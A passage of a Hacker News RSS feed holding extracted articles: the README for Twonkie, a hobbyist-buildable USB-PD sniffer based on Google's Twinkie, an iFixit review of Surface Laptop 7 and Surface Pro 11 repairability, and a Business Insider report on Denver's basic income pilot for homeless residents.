            <description><![CDATA[<p>URL: <a href="https://shraiwi.github.io/read.html?md=blog/simd-fast-esp32s3.md">https://shraiwi.github.io/read.html?md=blog/simd-fast-esp32s3.md</a>, See on <a href="https://news.ycombinator.com/item?id=40783598">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Twonkie: A USB-PD sniffer/injector/sink based on Google's Twinkie open hardware (135 pts)]]></title>
            <link>https://github.com/dojoe/Twonkie</link>
            <guid>40783485</guid>
            <pubDate>Tue, 25 Jun 2024 01:55:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/dojoe/Twonkie">https://github.com/dojoe/Twonkie</a>, See on <a href="https://news.ycombinator.com/item?id=40783485">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Twonkie - a USB-PD sniffer based on Google's <a href="https://www.chromium.org/chromium-os/twinkie" rel="nofollow">Twinkie</a></h2><a id="user-content-twonkie---a-usb-pd-sniffer-based-on-googles-twinkie" aria-label="Permalink: Twonkie - a USB-PD sniffer based on Google's Twinkie" href="#twonkie---a-usb-pd-sniffer-based-on-googles-twinkie"></a></p>
<p dir="auto">Twonkie is a USB-PD sniffer/injector/sink based on a Google project called Twinkie, re-engineered to be made in one-off quantities by mere mortals.</p>
<p dir="auto">Twinkie is a great and pretty low-cost solution, and it's open-source so anyone could make their own, but unfortunately the Twinkie design uses a six-layer PCB and all BGA/wafer-scale parts - both of which are usually unavailable to the humble hobbyist.</p>
<p dir="auto">So I designed the Twonkie, a slightly wonky sibling of Twinkie. It uses a four-layer PCB that can be manufactured cheaply by lots of services like OSHPark, and it makes a point to use only leaded parts for easier soldering (though the main microcontroller can optionally be QFN too via a dual footprint). The most difficult parts are likely the passives which are all 0402, and the USB-C connectors which are used in an unconventional way by misusing 90° upright connectors as 1.6mm straddle mounts (living up to the concept of being wonky).</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What does it look like?</h2><a id="user-content-what-does-it-look-like" aria-label="Permalink: What does it look like?" href="#what-does-it-look-like"></a></p>
<p dir="auto">Lookie here!</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/dojoe/Twonkie/blob/master/pic/twonkie-v1.0-front.jpg"><img src="https://github.com/dojoe/Twonkie/raw/master/pic/twonkie-v1.0-front.jpg" alt=""></a>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/dojoe/Twonkie/blob/master/pic/twonkie-v1.0-back.jpg"><img src="https://github.com/dojoe/Twonkie/raw/master/pic/twonkie-v1.0-back.jpg" alt=""></a></p>
<p dir="auto">The PCB is exactly 1 inch squared, so $10 will get you three at OSHPark. In fact, let me take care of that for you:</p>
<p dir="auto"><a href="https://oshpark.com/shared_projects/VxczZuoj" rel="nofollow"><img src="https://camo.githubusercontent.com/f338b8120161187faf8c5055f87443870199b2b9b210582994217ead76bc1032/68747470733a2f2f6f73687061726b2e636f6d2f7061636b732f6d656469612f696d616765732f62616467652d35663465336266346266363866373266663838626439326530303839653963662e706e67" alt="Order from OSH Park" data-canonical-src="https://oshpark.com/packs/media/images/badge-5f4e3bf4bf68f72ff88bd92e0089e9cf.png"></a></p>
<p dir="auto"><em>(Disclaimer: I am not affiliated with OSHPark, I just love their service to bits and they've been super helpful chaps time and time again.)</em></p>
<p dir="auto">The v1.0 and v2.0 Gerbers in this repo no longer need the botch wires around Q4 either, I'll update the photo as soon as I get the next board revision back.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What's changed compared to the original Twinkie?</h2><a id="user-content-whats-changed-compared-to-the-original-twinkie" aria-label="Permalink: What's changed compared to the original Twinkie?" href="#whats-changed-compared-to-the-original-twinkie"></a></p>
<ul dir="auto">
<li>A bootloader button in addition to the USB_ID pin based bootloader selection.</li>
<li>Uses the INA237 part which supports the higher supply voltages of USB-PD Extended Power Range (EPR)</li>
<li>The microcontroller pins are rearranged for easier routing, so you'll need a different firmware. Binaries are provided and the firmware is easy to build from source.</li>
<li>The USB-C connectors are attached in a hair-raising straddle mount configuration. The way they're soldered to the PCB makes them rock solid though, maybe even more solid than the original Twinkie, and they transfer TB3 20Gbit/s lanes just fine.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">I see there's a v2.0 now - what's different?</h2><a id="user-content-i-see-theres-a-v20-now---whats-different" aria-label="Permalink: I see there's a v2.0 now - what's different?" href="#i-see-theres-a-v20-now---whats-different"></a></p>
<p dir="auto">The 2.0 version uses a different voltage/current monitor chip compared to Twonkie v1.0, the <a href="https://github.com/dojoe/Twonkie/blob/master/ref/ina237.pdf">INA237</a>, which supports higher bus voltages and therefore makes the Twonkie hardware ready for Extended Power Range (EPR). The INA260 used by Twonkie v1.0 (and the INA231 used by Twinkie) will take damage if subjected to the up to 48V specified by EPR.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Sweet! How do I build my own?</h2><a id="user-content-sweet-how-do-i-build-my-own" aria-label="Permalink: Sweet! How do I build my own?" href="#sweet-how-do-i-build-my-own"></a></p>
<p dir="auto">I'm glad you asked! Get the board made via the OSH Park link above, or supply the v2.0 Gerbers in this repository to a PCB fab of your choice, get the parts from Digikey or Mouser or what have you, and follow the <a href="https://github.com/dojoe/Twonkie/blob/master/hw/README.md">Assembly instructions</a> to build the device. I recommend ordering a few extra parts: Get one more of each Type-C connector since you're going to modify them in ways that might end up with a broken connector, and generously round up the number of 0402 passives since you're going to drop some of them and you will <em>never</em> find them again :)</p>
<p dir="auto">For the firmware, there are <a href="https://github.com/dojoe/Twonkie/blob/master/fw/README.md">Instructions for building and flashing</a> in the <a href="https://github.com/dojoe/Twonkie/blob/master/fw">fw</a> directory.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">None of the parts are available 😭 What do I do?</h2><a id="user-content-none-of-the-parts-are-available--what-do-i-do" aria-label="Permalink: None of the parts are available 😭 What do I do?" href="#none-of-the-parts-are-available--what-do-i-do"></a></p>
<p dir="auto">Here are some ideas about replacements for some parts that are most likely to be unavailable. None of these have been tested so you're on your own!</p>
<ul dir="auto">
<li><strong>INA237:</strong> The INA237 is part of a device family and has two siblings with higher specs that TI claims are drop-in replacements: INA228 and INA238.</li>
<li><strong>STM32F072CB:</strong> For one, the Twonkie has a dual footprint that will fit both the TQFP and QFN variants, i.e. the STM32F072CBT and STM32F072CBU. And if you are willing to sacrifice the PD sink functionaliy and only need the sniffer functionality you could also try the variants with 64k flash instead of 128k (STM32F072C8*) and only flash the first half of the firmware binary. Other device families than the F072 would require extensive firmware changes so I can't recommend that.</li>
<li><strong>USB-C plug / receptacle:</strong> These might be a little trickier. Basically you need one that's meant for being mounted standing up on a board, has all USB-C pins wired out to L shaped pins and doesn't have any metal mounting prongs protruding into the board plane (or if it has you'll have to cut them off).</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">I am a noob trying to solder and replicate the Twonkie. Got any beginner tips?</h2><a id="user-content-i-am-a-noob-trying-to-solder-and-replicate-the-twonkie-got-any-beginner-tips" aria-label="Permalink: I am a noob trying to solder and replicate the Twonkie. Got any beginner tips?" href="#i-am-a-noob-trying-to-solder-and-replicate-the-twonkie-got-any-beginner-tips"></a></p>
<p dir="auto">The KiCad schematic file contains the vendor part numbers and DigiKey order numbers for each part designator, and I exported the full list into a .csv file too - those are commonly called "Bill of materials" or BOM for short, and <a href="https://github.com/dojoe/Twonkie/blob/master/hw/v2.0/twonkie.bom.csv">this is the one for Twonkie 2.0</a>. You should be able to punch those part numbers into a parts supplier of your choice (I usually use <a href="https://digikey.com/" rel="nofollow">DigiKey</a> but there are plenty others) to find the parts you need. If they have parts in stock they'll happily sell you small quantities, though at an increased price. Take care to order more of most parts than you need - especially the tiny passives (resistors, capacitors...) are easy to lose during assembly.</p>
<p dir="auto">As for reading the schematic, it probably helps to have some familiarity with <a href="https://www.usb.org/document-library/usb-power-delivery" rel="nofollow">USB-PD</a> and the <a href="https://www.chromium.org/chromium-os/twinkie" rel="nofollow">original project description</a>, and then read up on the <a href="https://github.com/dojoe/Twonkie/blob/master/ref">device datasheets</a> to understand which part does what.</p>
<p dir="auto">Having said all that, please be warned that the Twonkie is not exactly a noob project - unless you're already familiar with hand-soldering fine pitch SMT parts you may be in for a frustrating experience. Don't let that keep you from trying, but you should know what you're signing up for :)</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">TODOs</h2><a id="user-content-todos" aria-label="Permalink: TODOs" href="#todos"></a></p>
<ul>
<li> Get Twinkie support upstreamed in sigrok/PulseView</li>
<li> v2.0 photos</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Similar projects</h2><a id="user-content-similar-projects" aria-label="Permalink: Similar projects" href="#similar-projects"></a></p>
<ul dir="auto">
<li>As luck would have it, <a href="https://github.com/gregdavill">Greg Davill</a> started a project with the exact same goal at a very similar time, so there's now two of us :) <a href="https://github.com/gregdavill/PD-sniffer">https://github.com/gregdavill/PD-sniffer</a></li>
<li><a href="https://github.com/XenGi">XenGi</a> built a version of Twonkie v2.0 which uses a 0.8mm PCB and industry-standard straddle mount USB-C connectors. After <a href="https://github.com/dojoe/Twonkie/issues/10" data-hovercard-type="issue" data-hovercard-url="/dojoe/Twonkie/issues/10/hovercard">a bit of deliberation</a> I decided to stick with the 1.6mm PCB for stability and availability reasons but if you prefer a less haxxy way of attaching the connectors (and a 3D printed case!) feel free to check out his repo: <a href="https://gitlab.com/XenGi/Twonkie" rel="nofollow">https://gitlab.com/XenGi/Twonkie</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Licenses</h2><a id="user-content-licenses" aria-label="Permalink: Licenses" href="#licenses"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Hardware (as found in the <code>hw</code> subdirectory)</h2><a id="user-content-hardware-as-found-in-the-hw-subdirectory" aria-label="Permalink: Hardware (as found in the hw subdirectory)" href="#hardware-as-found-in-the-hw-subdirectory"></a></p>
<p dir="auto">The hardware design of <a href="https://github.com/dojoe/Twonkie">Twonkie</a> by <a href="https://github.com/dojoe">Joachim "dojoe" Fenkes</a> is licensed under <a href="http://creativecommons.org/licenses/by/4.0/" rel="nofollow">CC BY 4.0<img src="https://camo.githubusercontent.com/9a94a9da920fb502de91699e841f6eec7eda7b02c7e2dcd770eb9dbb7083ea76/68747470733a2f2f6d6972726f72732e6372656174697665636f6d6d6f6e732e6f72672f70726573736b69742f69636f6e732f63632e737667" data-canonical-src="https://mirrors.creativecommons.org/presskit/icons/cc.svg"><img src="https://camo.githubusercontent.com/007437ca114fb64a0db48d5f06ee0f8d95242b8b9230af6c92fceb70fa234507/68747470733a2f2f6d6972726f72732e6372656174697665636f6d6d6f6e732e6f72672f70726573736b69742f69636f6e732f62792e737667" data-canonical-src="https://mirrors.creativecommons.org/presskit/icons/by.svg"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Firmware (as found in the <code>fw</code> subdirectory)</h2><a id="user-content-firmware-as-found-in-the-fw-subdirectory" aria-label="Permalink: Firmware (as found in the fw subdirectory)" href="#firmware-as-found-in-the-fw-subdirectory"></a></p>
<p dir="auto">The source code for the Twonkie's firmware is licensed under the 3-clause BSD license, see <a href="https://github.com/dojoe/Twonkie/blob/master/fw/LICENSE">its LICENSE file</a>.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[From 0/10 to 8/10: Microsoft Puts Repair Front and Center (213 pts)]]></title>
            <link>https://www.ifixit.com/News/96998/from-0-10-to-8-10-microsoft-puts-repair-front-and-center</link>
            <guid>40783229</guid>
            <pubDate>Tue, 25 Jun 2024 01:19:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ifixit.com/News/96998/from-0-10-to-8-10-microsoft-puts-repair-front-and-center">https://www.ifixit.com/News/96998/from-0-10-to-8-10-microsoft-puts-repair-front-and-center</a>, See on <a href="https://news.ycombinator.com/item?id=40783229">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    
<p>Microsoft’s team of hardware wizards have spent the last couple of years practicing their Reparo spell and it’s really starting to show. And we’ve noticed, it’s hard not to. It wasn’t that long ago that the Surface team surprised us with a tablet that went from <a href="https://www.ifixit.com/Teardown/Microsoft+Surface+Pro+Teardown/12842">1/10 in 2013</a> to<a href="https://www.ifixit.com/News/68671/does-the-surface-pro-9-mark-a-turning-point-for-repairability-at-microsoft"> a stunning 7/10</a> in 2022. Needless to say, the new CoPilot+ devices definitely warranted a check in to see how repair was fairing over at Microsoft.</p>



<p>We weren’t disappointed.</p>



<figure><p>
<iframe title="Surface Pro 11 &amp; Surface Laptop 7 Teardowns - Repairable, AI Powered Devices!!!" width="456" height="257" src="https://www.youtube-nocookie.com/embed/Eg7KXJQ0p00?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>This time around we decided to take a look at both Surface Pro and Surface Laptop devices. The first time we tore down a Surface Laptop it received an <a href="https://www.ifixit.com/Teardown/Microsoft+Surface+Laptop+Teardown/92915">abysmal 0/10</a>. Some claimed the score was too harsh, our Teardown Engineers thought it wasn’t harsh enough.</p>



<figure><img fetchpriority="high" decoding="async" width="1600" height="1067" src="https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1.jpg" alt="" srcset="https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1.jpg 1600w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-1536x1024.jpg 1536w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-1350x900.jpg 1350w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-300x200.jpg 300w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-600x400.jpg 600w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-1200x800.jpg 1200w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-768x512.jpg 768w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-324x216.jpg 324w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164539/Surface-Laptop-1-450x300.jpg 450w" sizes="(max-width: 1600px) 100vw, 1600px"><figcaption><em>You’re asking for a 0/10 if we have to cut our way to the battery</em></figcaption></figure>



<h2>Surface Laptop 7</h2>



<p>The Surface Laptop 7 is an astonishingly repair friendly device, almost the antithesis of the original Surface Laptop. It’s no Framework 13, but it clearly draws inspiration from it.</p>



<p>One of the first things you’ll see when removing the magnetically secured bottom plate is a QR code taking you to the service manuals on Microsoft’s website. The manuals were made available the very day the device was released, something we rarely see in any product category.</p>



<p>The next things you’ll notice are tiny symbols (Microsoft calls them Wayfinders) indicating which component is being secured by the type and quantity of screws. You could easily disassemble this device without using the manual thanks to these Wayfinders.</p>



<figure><img decoding="async" width="3585" height="2390" src="https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders.jpg" alt="" srcset="https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders.jpg 3585w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-1536x1024.jpg 1536w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-2048x1365.jpg 2048w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-1350x900.jpg 1350w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-300x200.jpg 300w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-600x400.jpg 600w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-1200x800.jpg 1200w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-768x512.jpg 768w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-324x216.jpg 324w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164657/wayfinders-450x300.jpg 450w" sizes="(max-width: 3585px) 100vw, 3585px"><figcaption>The battery is secured by eight 5IP Torx screws.</figcaption></figure>



<p>A special mention should be made of how most components are accessible without the need to remove additional layers. Need to replace the battery? No problem, it’s just a few screws and a bracket. What if you need to clean the fan? Easy. Just peel back the Surflink cable and undo three screws.</p>



<p>This might seem small to some but it shouldn’t be taken for granted. Take the MSI GS65, a laptop that had its fair share of fan failures. You have to remove <a href="https://www.ifixit.com/Guide/MSI+GS65+Stealth+Thin+8RE+Fan++Assembly++Replacement/130584">the entire motherboard and thermal management system</a> just to replace a wonky fan!</p>



<h2>Surface Pro 11</h2>



<p>Thankfully the Surface Pro 11 also contained many of the same repairability improvements. A tablet PC will inherently be more difficult to repair when compared to a laptop, purely because the screen removal process can feel a bit hairy.</p>



<p>But if we consider it as its own distinct category of device—comparing it relative to other tablet-like devices and not laptops, which we do in our scoring process—the Surface Pro holds up well for repairability.</p>



<p>As with past generation Surface Pro’s, we have access to the M.2 drive via a small magnetic cover underneath the kickstand. Access to anything else requires some disassembly. With the screen off, we find QR codes and Wayfinder markers to aid in the disassembly process.</p>



<p>There are more layers of components, which is to be expected when you have half the space to work with. The Surflink cable and the thermal management system need to be removed before we can remove the battery. But all in all, the process isn’t too onerous, especially with manuals to hand.</p>



<figure><img loading="lazy" decoding="async" width="7360" height="4906" src="https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1.jpg" alt="" srcset="https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1.jpg 7360w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-1536x1024.jpg 1536w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-2048x1365.jpg 2048w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-1350x900.jpg 1350w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-300x200.jpg 300w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-600x400.jpg 600w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-1200x800.jpg 1200w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-768x512.jpg 768w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-324x216.jpg 324w, https://valkyrie.cdn.ifixit.com/media/2024/06/21170600/Surface-thermals-out2-1-450x300.jpg 450w" sizes="(max-width: 7360px) 100vw, 7360px"><figcaption>The battery isn’t too difficult to retrieve and is held in place by screws. Not a drop of glue in sight.</figcaption></figure>



<p>A note on that Surflink cable, the two screws holding the port in place are non-magnetic. It’s such a small detail but it will be appreciated by anyone who’s ever had to reassemble a magnetic component while dealing with the frustration of having to hold a screw in place with tweezers to prevent it from flying towards the magnet right next to it.</p>



<p>Overall, we were extremely pleased with Microsoft’s continued commitment to repairability. The Surface line of devices have performed such a stunning and swift U-turn from unrepairable to very repairable that we can’t help but be impressed, even if they don’t score a perfect 10/10.</p>



<figure>
<figure><img loading="lazy" decoding="async" width="600" height="400" data-id="97003" src="https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-600x400.jpg" alt="" srcset="https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-600x400.jpg 600w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-1536x1024.jpg 1536w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-2048x1365.jpg 2048w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-1350x900.jpg 1350w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-300x200.jpg 300w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-1200x800.jpg 1200w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-768x512.jpg 768w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-324x216.jpg 324w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164940/Surface-Interior-450x300.jpg 450w" sizes="(max-width: 600px) 100vw, 600px"></figure>



<figure><img loading="lazy" decoding="async" width="600" height="400" data-id="97002" src="https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-600x400.jpg" alt="" srcset="https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-600x400.jpg 600w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-1536x1024.jpg 1536w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-2048x1365.jpg 2048w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-1350x900.jpg 1350w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-300x200.jpg 300w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-1200x800.jpg 1200w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-768x512.jpg 768w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-324x216.jpg 324w, https://valkyrie.cdn.ifixit.com/media/2024/06/21164938/laptop-interior-450x300.jpg 450w" sizes="(max-width: 600px) 100vw, 600px"></figure>
</figure>



<p>Speaking of which, after careful consideration and much lively debating, we decided to award both the Surface Laptop 7 and Surface Pro 11 an 8/10 for repairability in their respective device categories. </p>



<p>Microsoft’s journey from the unrepairable Surface Laptop to the highly repairable devices on our teardown table should drive home the importance of designing for repair. The ability to create a repairable Surface was always there but the impetus to design for repairable was missing. I’ll take that as a sign that Right to Repair advocacy and legislation has begun to bear fruit.&nbsp;</p>



<p><em>You can find chip ID information for the </em><a href="https://www.ifixit.com/Device/Microsoft_Surface_Laptop_7"><em>Surface Laptop 7</em></a><em> and </em><a href="https://www.ifixit.com/Device/Microsoft_Surface_Pro_11"><em>Surface Pro 11</em></a><em> on their respective guide pages once they’re available.</em></p>
    
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Denver gave homeless people $1k/mth. Year later, nearly half had housing (126 pts)]]></title>
            <link>https://www.businessinsider.com/denver-basic-income-reduces-homelessness-food-insecurity-housing-ubi-gbi-2024-6</link>
            <guid>40783158</guid>
            <pubDate>Tue, 25 Jun 2024 01:10:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.businessinsider.com/denver-basic-income-reduces-homelessness-food-insecurity-housing-ubi-gbi-2024-6">https://www.businessinsider.com/denver-basic-income-reduces-homelessness-food-insecurity-housing-ubi-gbi-2024-6</a>, See on <a href="https://news.ycombinator.com/item?id=40783158">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Jarun Laws lived in his car in a restaurant parking lot near downtown Denver. <a target="_blank" href="https://www.businessinsider.com/denver-guaranteed-basic-income-gbi-ubi-housing-security-homeless-rent-2024-2" data-analytics-product-module="body_link" rel="">He worked there as a cook</a><strong> </strong>until 2020, and had only $400 a month left after paying bills and child support. That was barely enough to cover his car payments and child support — and not even close to what he would need for rent.</p><p>The 51-year-old<strong> </strong>occasionally spent part of his paycheck on weekend stays at a cheap hotel, where he could spend time with his children. He struggled to afford food, clothes, and medicine — and he had been experiencing homelessness for nearly a decade.</p><div><p>That changed when Laws enrolled in <a target="_blank" href="https://www.businessinsider.com/ubi-cash-payments-reduced-homelessness-increased-employment-denver-2023-10" data-analytics-product-module="body_link" rel="">The Denver Basic Income Project</a>. The pilot program allowed Laws to secure a temporary apartment with furniture, spend more time with his children, and find a better-paying job.</p><p>"I had questioned myself: if I was going to be a good father to my children because I was suffering," Laws previously told Business Insider. "When I got accepted, it changed my life."</p><p>Denver's basic income pilot — which first started payments in fall 2022 — focused on over 800 Coloradans experiencing homelessness, including people living in cars, temporary shelters, the outdoors, or other non-fixed living situations. Participants like Laws were given direct cash payments, <a target="_blank" href="https://www.businessinsider.com/which-states-cities-have-guaranteed-basic-income-programs-low-income-2024-4" data-analytics-product-module="body_link" rel="">no strings attached</a>, and could spend the money on whatever they needed.</p><p>Denver released the project's one-year report on<strong> </strong>June 18, showing that 45% of participants secured their own house or apartment after receiving basic income for 10 months. They also experienced fewer emergency room visits, nights spent in a hospital or a temporary shelter, and jail stays. The report estimates that this reduction in public service use saved the city $589,214.</p><p>Denver's program initially lasted one year and was <a target="_blank" href="https://www.businessinsider.com/denver-basic-income-project-ubi-extended-homelessness-poverty-2024-1" data-analytics-product-module="body_link" rel="">extended in January for another six months</a>. Participants were sorted into random groups: one received $1,000 a month for a year; another got $6,500 upfront, followed by $500 a month; and a third got $50 a month as a control group.</p><p>The city of Denver, the Colorado Trust, and an anonymous foundation funded the project and has already provided more than $9.4 million to participants.</p><p>Basic income programs like Denver's have become <a target="_blank" href="https://www.businessinsider.com/basic-income-gbi-ubi-low-income-americans-afford-housing-food-2024-5" data-analytics-product-module="body_link" rel="">a popular strategy to reduce poverty</a> in US cities. Compared to traditional social services like <a target="_blank" href="https://www.businessinsider.com/buying-groceries-snap-food-stamps-cant-afford-essentials-credit-card-2024-6" data-analytics-product-module="body_link" rel="">SNAP</a> or Medicaid, basic income allows participants to spend the money where they need it most.</p><p>"What is fundamentally different about our approach is the way that we start from a place of trust," Mark Donovan, the project founder and executive director, said at a Tuesday press conference.</p><h2 id="1b74210a-b49a-428b-aa18-dbe9189f9abd" data-toc-id="1b74210a-b49a-428b-aa18-dbe9189f9abd"><strong>Denver's basic income project helped participants secure housing and jobs</strong></h2><p>Denver's report found that basic income primarily helped participants pay for immediate expenses — like transportation, hygiene, clothes, and groceries. <a target="_blank" href="https://www.businessinsider.com/chicago-basic-income-helped-mother-rent-an-apartment-ubi-gbi2024-5?mrfhud=true" data-analytics-product-module="body_link" rel="">Affording recurring bills like rent</a>, healthcare, or debt payments was also a top priority for most families. Participants in each payment group reported increased financial stability and reduced reliance on emergency financial assistance programs.</p><p>Basic income puts low-income families on "an equal playing field," Nick Pacheco, participant engagement coordinator, said at a press conference. He said the cash payments also help participants get the training and resources they need to establish careers.</p><p>Individuals who received the lump sum or $1,000 a month payments were more likely to find a stable, full-time job than before they received basic income.</p><p>"It's freedom," Pacheco said. "It's freedom from poverty and not being able to reach your goals."</p><p>Participating households also experienced improved mental health and could spend more time with family and friends. Parents were able to <a target="_blank" href="https://www.businessinsider.com/san-antonio-ubi-guaranteed-basic-income-housing-finances-austin-rent-2024-3" data-analytics-product-module="body_link" rel="">better support their children and grandchildren</a>.</p><section data-component-type="content-recommendations" data-component-location="in-content" data-delay-third-party-scripts="true" data-provider="dad" data-excluded-verticals="bi-video" data-premium-state="" data-renderer="three-related-posts" data-size="3" data-container-position="" data-container-name="content-recommendations-three-related-posts-in-content" data-theme-class="default" data-recommendations-placement="" data-author="" data-root-margin="250px 0px" data-track-view="{&quot;event&quot;:&quot;module_in_view&quot;,&quot;eventCategory&quot;:&quot;in_content_recirc&quot;,&quot;eventAction&quot;:&quot;module_in_view&quot;,&quot;eventLabel&quot;:&quot;module_in_view&quot;,&quot;element_name&quot;:&quot;in_content_recirc&quot;,&quot;subscription_experience&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}">
                            <p>
                                Related stories
                              </p>
                        
                          
                        </section><p>These results echo those from the six-month report, which found fewer participants were sleeping on the street, experiencing food insecurity, and feeling unsafe.</p><p>Still, participants' financial outcomes varied based on their payment group. Participants who received the lump sum $6,500 payment in addition to $500 a month could better build savings and make major life changes like signing a new lease or buying a car.</p><p>Many families told researchers that they're <a target="_blank" href="https://www.businessinsider.com/universal-basic-income-emergency-cash-rent-homes-government-housing-aid-2024-1" data-analytics-product-module="body_link" rel="">anxious about paying bills</a> after the basic income payments end. Some worry they could lose their housing again.</p><p><a target="_blank" href="https://www.businessinsider.com/denver-guaranteed-basic-income-gbi-ubi-housing-security-homeless-rent-2024-2" data-analytics-product-module="body_link" rel="">Laws</a>, for example, had to go back to living in his car after his payments stopped.</p><h2 id="7877e820-05ba-4c6f-8ba2-27c9786dd3e7" data-toc-id="7877e820-05ba-4c6f-8ba2-27c9786dd3e7"><strong>Being able to pay bills alleviated participants' financial stress</strong></h2><p>Denver participants have told BI that basic income was the financial safety net they needed.</p><p>Moriah Rodriguez, 38, was working as a youth developer for Denver Public Schools when she got hit by a car and suffered a traumatic brain injury. She lived in public housing with her kids, all of whom have intellectual disabilities, though they were displaced shortly after.</p><p>She received monthly Social Security payments, just enough to care for her kids. While staying with a friend, she learned about the pilot program.</p><p>Rodriguez used the payments to fix her truck, transport her kids to school and work, buy new clothing, and secure a lifelong public housing voucher. She also used some of the money to pay $400 for rent, $500 on gas, $100 on hygiene, and $100 on her credit card bill. In addition to returning to school to get her GED, she brought her credit score into the 700s.</p><p>"The program gave me more time to focus on their education and their mental health," Rodriguez said, referring to her children, and added that the program's extension was another lifeline. "I had the space to get them tested and get them diagnosed and connected with the support they need."</p><p>Similarly, Dia Broncucia, 53, and Justin Searls, 45, could also afford essentials like an apartment, a new car, and mental health resources through basic income. They had previously lived in a temporary shelter but could secure a studio apartment for $1,300 a month, along with clothing, hygiene products, and furniture.</p><p><a target="_blank" href="https://www.businessinsider.com/universal-basic-income-ubi-denver-participants-turn-their-lives-around-2023-10" data-analytics-product-module="body_link" rel="">Broncucia and Searls said last October</a> that though they had some uncertainties about their future, they felt much stronger and less stressed because of basic income.</p><p>"Starting with nothing and then being able to receive a lump sum of money and then get our payments once a month is why we were able to get on track and stay on track," Broncucia previously told BI.</p><h2 id="fcf290b8-de5d-44fd-9e88-4430ad78df2a" 